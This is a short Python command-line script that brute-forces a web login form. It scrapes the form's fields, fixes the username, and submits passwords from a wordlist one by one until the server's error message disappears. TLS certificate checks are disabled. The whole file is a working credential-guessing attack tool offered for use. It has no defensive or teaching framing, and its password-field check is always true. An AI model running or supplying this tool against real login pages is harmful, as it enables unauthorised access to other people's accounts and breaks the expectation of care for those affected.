import urllib3
import requests
import argparse
from termcolor import colored
from bs4 import BeautifulSoup


parser = argparse.ArgumentParser()

parser.add_argument("-u", type = str, metavar = "<url>", help = "Specify url of the form you want to brute force", required=True)
parser.add_argument("-l", type = str, metavar = "<value>", help = "Specify value for login field", required=True)
parser.add_argument("-p", type = str, metavar = "<FILE>", help = "Specify the path of your file for password field", required=True)
parser.add_argument("-e", type = str, metavar = "<error message>", help = "Specify the error message return by the server", required=True)

args = parser.parse_args()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
s = requests.session()
s.verify = False

url = args.u
dict = {}
i = 0

with open(args.p,"r") as pfile:
    for password in pfile.read().splitlines():
        # Parse login form
        soup = BeautifulSoup(s.get(url).text, "html.parser")
        form = soup.find("form")
        if "type='password'" or 'type="password"' in form:
            for field in form.find_all("input"):
                dict[field.get("name")] = field.get("value")
            print("I found this form : " + str(dict) + "\n")
            # Define columns
            if i == 0:
                lfield = input("Please specify login field name : ")
                pfield = input("Please specify password field name : ")
            dict[lfield] = args.l
            dict[pfield] = password
            print("Form sent : " + str(dict))
            # Send form and verify
            rp = s.post(url, data=dict).text
            if not args.e in rp:
                print(colored("[+] Correct password Found: "+str(password), "green"))
                exit(0)
            else:
                print(colored("[-] "+str(password)+" not valid\n", "red"))
                i = 1
